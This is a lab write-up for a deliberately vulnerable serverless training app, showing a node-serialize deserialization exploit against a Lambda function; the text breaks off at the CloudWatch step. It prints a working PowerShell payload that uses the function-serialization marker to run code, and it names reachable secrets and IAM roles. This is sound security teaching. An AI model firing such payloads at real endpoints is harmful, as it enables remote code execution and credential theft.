# Lesson 9 — Vulnerable Dependencies (RCE via `node-serialize`)

## Goal & Summary

The `DVSA-ORDER-MANAGER` Lambda function uses [`node-serialize`](https://www.npmjs.com/package/node-serialize), a Node.js library known for [GHSA-q4v7-4rhw-9hqm](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm) — a **critical Remote Code Execution** vulnerability with no patch. The library deserializes JavaScript functions encoded with the marker `_$$ND_FUNC$$_`. If the encoded function ends with `()`, it becomes an Immediately Invoked Function Expression and runs the moment the payload is parsed.

The function passes the raw HTTP body to `serialize.unserialize()` with no validation, so an attacker can put arbitrary JavaScript inside a JSON body and have it execute on the Lambda runtime — which means filesystem access, environment variables (Cognito secrets, database creds), and the function's IAM role.

This lesson:
- Confirms the vulnerable dependency with `npm audit`
- Sends a payload that writes and reads a file inside `/tmp` and logs the contents
- Captures the proof-of-execution in CloudWatch logs (`FILE READ SUCCESS`)
- Replaces `serialize.unserialize()` with `JSON.parse()` and removes the dependency
- Verifies the same payload now fails with a `SyntaxError` and never executes

## Root Cause

`node-serialize` is by design able to deserialize JavaScript functions. There is no safe mode and no patched version. The fix is to remove the library entirely and use `JSON.parse()`, which only handles data and cannot evaluate functions.

## Setup

| Item | Value |
|------|-------|
| API Endpoint | `https://6sbqodmni7.execute-api.us-east-1.amazonaws.com/Stage/order` |
| Vulnerable Lambda | `DVSA-ORDER-MANAGER` |
| Vulnerable file | `order-manager.js` (line 1: `require('node-serialize')`, lines 9–10: `serialize.unserialize(...)`) |
| Log group | `/aws/lambda/DVSA-ORDER-MANAGER` |
| Tools | PowerShell (`Invoke-WebRequest`), AWS Console, CloudWatch Logs, `npm audit` |

## Steps to reproduce the exploit

### 1. Confirm the vulnerable dependency

In the cloned DVSA backend folder for the `order-manager` function:

```powershell
npm install
npm audit
```

`npm audit` flags `node-serialize` as a critical-severity vulnerability with **no fix available**:

![npm audit output flagging node-serialize](./screenshots/01-npm-audit-node-serialize-critical.png)

`package.json` shows the dependency directly:

![package.json with node-serialize dependency](./screenshots/02-package-json-vulnerable-dependency.png)

### 2. Inspect the vulnerable code path

`order-manager.js` deserializes the entire request body with `serialize.unserialize()`:

![Vulnerable source: serialize.unserialize on event.body](./screenshots/03-vulnerable-source-code.png)

The full vulnerable file is in [`code/order-manager-vulnerable.js`](./code/order-manager-vulnerable.js).

### 3. Send the malicious payload

In PowerShell, set the API URL and send a JSON body whose `action` field is a serialized JavaScript function. The full payload script is in [`code/exploit-payload.ps1`](./code/exploit-payload.ps1). The function writes a file, reads it back, and logs `FILE READ SUCCESS` so we can prove it ran:

```powershell
$API_URL = "https://6sbqodmni7.execute-api.us-east-1.amazonaws.com/Stage/order"
$body    = '{"action": "_$$ND_FUNC$$_function(){ var fs = require(\"fs\"); fs.writeFileSync(\"/tmp/pwned.txt\", \"You are reading the contents of my hacked file!\"); var fileData = fs.readFileSync(\"/tmp/pwned.txt\", \"utf-8\"); console.error(\"FILE READ SUCCESS: \" + fileData); }()", "cart-id": ""}'

Invoke-WebRequest -Uri $API_URL -Method POST -ContentType "application/json" -Body $body
```

The HTTP response is `Internal server error` — that's expected and is **not** the evidence of success. The real evidence is in CloudWatch.

![PowerShell payload sent](./screenshots/04-powershell-malicious-payload-sent.png)

### 4. Confirm execution in CloudWatch

CloudWatch → Log groups → `/aws/lambda/DVSA-ORDER-MANAGER` → newest log stream. The log entry shows the injected `console.error` output:
